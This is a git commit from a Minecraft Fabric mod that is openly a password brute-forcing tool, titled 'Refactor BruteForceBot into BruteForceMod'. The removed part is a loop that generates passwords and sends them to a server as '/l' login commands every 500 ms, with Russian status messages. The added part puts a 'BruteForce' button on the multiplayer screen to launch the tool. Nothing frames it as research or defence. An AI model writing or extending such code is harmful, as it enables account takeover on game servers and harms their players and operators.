d783abd288aece49e49630e248ab77b0f3890d56
DragonBoxOwner <solvers657@gmail.com>
2026-08-20 20:36:52 +0500

    Refactor BruteForceBot into BruteForceMod

--- src/main/java/net/novabruteforce/BruteForceBot.java
+++ src/main/java/net/novabruteforce/BruteForceBot.java
@@ -1,63 +1,22 @@
 package net.novabruteforce;
 
-import net.minecraft.client.MinecraftClient;
-import net.minecraft.client.network.ClientPlayNetworkHandler;
+import net.fabricmc.api.ModInitializer;
+import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents;
+import net.minecraft.client.gui.screen.TitleScreen;
+import net.minecraft.client.gui.screen.multiplayer.MultiplayerScreen;
+import net.minecraft.client.gui.widget.ButtonWidget;
 import net.minecraft.text.Text;
 
-public class BruteForceBot {
-    private Thread thread;
-    private volatile boolean running = false;
-    private final String ip;
-    private final String name;
-    private final BruteForceScreen screen;
-    private PasswordGenerator generator;
-
-    public BruteForceBot(String ip, String name, BruteForceScreen screen) {
-        this.ip = ip;
-        this.name = name;
-        this.screen = screen;
-        this.generator = new PasswordGenerator();
-    }
-
-    public void start() {
-        running = true;
-        thread = new Thread(() -> {
-            while (running) {
-                String password = generator.generate();
-                screen.updatePassword(password);
-                
-                MinecraftClient client = MinecraftClient.getInstance();
-                client.execute(() -> {
-                    ClientPlayNetworkHandler handler = client.getNetworkHandler();
-                    if (handler != null) {
-                        handler.sendCommand("l " + password);
-                        screen.updateStatus("Попытка: " + password);
-                    } else {
-                        screen.updateStatus("Не подключён к серверу!");
-                        running = false;
-                    }
-                });
-
-                try {
-                    Thread.sleep(500);
-                } catch (InterruptedException e) {
-                    break;
-                }
+public class BruteForceMod implements ModInitializer {
+    @Override
+    public void onInitialize() {
+        ScreenEvents.BEFORE_INIT.register((client, screen, scaledWidth, scaledHeight) -> {
+            if (screen instanceof MultiplayerScreen) {
+                screen.addDrawableChild(ButtonWidget.builder(
+                    Text.literal("BruteForce"),
+                    button -> client.setScreen(new BruteForceScreen())
+                ).dimensions(scaledWidth - 120, 10, 110, 20).build());
             }
-            screen.updateStatus("Остановлен");
-            screen.updatePassword("");
         });
-        thread.start();
-    }
-
-    public void stop() {
-        running = false;
-        if (thread != null) {
-            thread.interrupt();
-        }
-    }
-
-    public boolean isRunning() {
-        return running;
     }
 }
